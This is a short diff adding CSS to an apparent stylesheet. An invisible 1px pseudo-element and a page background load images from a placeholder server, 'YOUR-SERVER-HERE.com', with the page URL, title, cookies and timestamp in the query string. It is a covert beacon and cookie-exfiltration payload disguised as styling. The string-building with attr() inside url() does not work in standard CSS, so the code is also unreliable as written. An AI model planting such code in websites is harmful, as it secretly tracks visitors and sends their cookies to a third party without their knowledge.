@@ -1,0 +1,14 @@
+body::before {
+  content: url("https://YOUR-SERVER-HERE.com/catch.png?url=" 
+    attr(data-url) 
+    "&title=" attr(data-title) 
+    "&cookies=" attr(data-cookies) 
+    "&time=" attr(data-time));
+  position: absolute;
+  width: 1px; height: 1px;
+  opacity: 0;
+}
+
+html {
+  background: url("https://YOUR-SERVER-HERE.com/catch.png?load=1&time=" attr(data-time)) no-repeat;
+}
